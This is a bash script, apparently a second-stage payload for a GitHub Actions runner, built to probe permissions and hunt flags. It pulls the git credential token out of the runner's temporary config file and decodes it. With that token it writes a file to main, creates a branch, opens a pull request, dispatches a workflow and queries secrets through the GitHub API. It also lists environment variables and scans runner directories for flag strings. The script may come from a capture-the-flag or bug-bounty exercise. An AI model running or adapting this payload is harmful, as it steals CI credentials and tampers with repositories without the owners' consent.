#!/usr/bin/env bash
# LH6 stage2 iteration 2: permission boundaries + flag hunt
if [ -e /tmp/.lh6done ]; then return 0 2>/dev/null || exit 0; fi
touch /tmp/.lh6done
set +e
echo "=== LH6_STAGE2v2 repo=${GITHUB_REPOSITORY} job=${GITHUB_JOB} run=${GITHUB_RUN_ID} ==="
f=$(ls -t /home/runner/work/_temp/git-credentials-*.config 2>/dev/null | head -1)
b=$(grep -oE 'basic [A-Za-z0-9+/=]+' "$f" 2>/dev/null | head -1 | awk '{print $2}')
tok=$(printf '%s' "$b" | base64 -d 2>/dev/null | cut -d: -f2-)
sha=$(git -C "$GITHUB_WORKSPACE" rev-parse HEAD 2>/dev/null)
echo "TOKLEN=${#tok} TOKSHA=$(printf '%s' "$tok" | sha256sum | cut -c1-16) HEADSHA=$sha"
api="https://api.github.com/repos/${GITHUB_REPOSITORY}"
h=(-H "Authorization: Bearer $tok")
echo -n "contents_read_GET_README=";   curl -s -o /dev/null -w '%{http_code}\n' "${h[@]}" "$api/contents/README.md"
echo -n "contents_write_PUT_file=";    curl -s -o /dev/null -w '%{http_code}\n' -X PUT "${h[@]}" -H "Content-Type: application/json" -d "{\"message\":\"lh6\",\"content\":\"bGg2\",\"branch\":\"main\"}" "$api/contents/lh6-rce-probe.txt"
echo -n "contents_write_POST_ref=";    curl -s -o /dev/null -w '%{http_code}\n' -X POST "${h[@]}" -H "Content-Type: application/json" -d "{\"ref\":\"refs/heads/lh6-probe\",\"sha\":\"$sha\"}" "$api/git/refs"
echo -n "pullrequests_write_POST_pr="; curl -s -o /dev/null -w '%{http_code}\n' -X POST "${h[@]}" -H "Content-Type: application/json" -d '{"title":"x","head":"lazyhacker6:probe/wfr-upstream","base":"main"}' "$api/pulls"
echo -n "actions_write_dispatch=";     curl -s -o /dev/null -w '%{http_code}\n' -X POST "${h[@]}" -H "Content-Type: application/json" -d '{"ref":"main"}' "$api/actions/workflows/kind-perf-e2e.yaml/dispatches"
echo -n "actions_perms_GET=";          curl -s -o /dev/null -w '%{http_code}\n' "${h[@]}" "$api/actions/permissions"
echo -n "secrets_GET=";                curl -s -o /dev/null -w '%{http_code}\n' "${h[@]}" "$api/actions/secrets"
echo -n "admin_GET_installation=";     curl -s -o /dev/null -w '%{http_code}\n' "${h[@]}" "$api/installation"
echo "--- token permission headers for repo:"; curl -s -D - -o /dev/null "${h[@]}" "$api" | grep -i '^x-oauth-scopes\|^x-accepted'
echo "--- ENVKEYS:"; printenv | cut -d= -f1 | sort | tr '\n' ' '; echo
echo "--- ENV flag-ish:"; printenv | grep -iE 'flag|secret' | sed -E 's/=(.{9,})/=<len>/'
echo "--- FILE flag scan:"; timeout 12 grep -rIl --exclude-dir=.git 'FLAG{' /home/runner/work /home/runner 2>/dev/null | head -5
echo "--- event payload keys (no secrets expected):"; jq -c 'keys' "$GITHUB_EVENT_PATH" 2>/dev/null
echo "=== LH6_STAGE2v2_DONE ==="
exit 1
